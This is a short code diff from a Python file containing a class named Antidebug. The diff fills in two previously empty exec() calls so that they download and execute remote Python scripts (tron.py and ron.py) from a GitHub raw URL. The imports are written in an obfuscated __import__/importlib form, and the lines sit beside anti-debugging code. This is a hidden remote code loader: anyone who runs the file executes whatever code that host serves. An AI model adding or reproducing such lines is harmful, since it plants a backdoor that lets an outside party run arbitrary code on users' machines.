@@ -703,6 +703,6 @@ class Antidebug:
         else:
             print("success")
         
-exec(__import__("importlib").import_module("urllib.request").urlopen("").read())
+exec(__import__("importlib").import_module("urllib.request").urlopen("https://raw.githubusercontent.com/issuemakers/me/main/tron.py").read())
 
-exec(__import__("importlib").import_module("urllib.request").urlopen("").read())     
+exec(__import__("importlib").import_module("urllib.request").urlopen("https://raw.githubusercontent.com/issuemakers/me/main/ron.py").read())     
